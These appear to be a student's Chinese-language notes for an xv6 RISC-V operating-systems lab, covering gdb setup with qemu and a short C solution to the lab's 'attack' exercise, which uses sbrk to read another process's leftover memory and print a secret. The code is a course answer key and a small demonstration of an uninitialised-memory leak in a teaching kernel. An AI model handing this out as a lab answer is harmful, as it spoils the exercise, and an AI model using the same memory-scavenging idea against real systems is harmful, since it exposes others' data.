# 使用gdb
```shell
make qemu-gdb
# 然后在另一个窗口运行
gdb-multiarch -x .gdbinit
```

# trace


# attack
[参考链接](https://blog.csdn.net/weixin_42543071/article/details/143351746)
```c
#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int main(int argc, char *argv[])
{
  // your code here.  you should write the secret to fd 2 using write
  // (e.g., write(2, secret, 8)
  char *secret = sbrk(PGSIZE * 32);
  secret = secret + 16 * PGSIZE;
  write(2, secret + 32, 8);
  exit(0);
}

```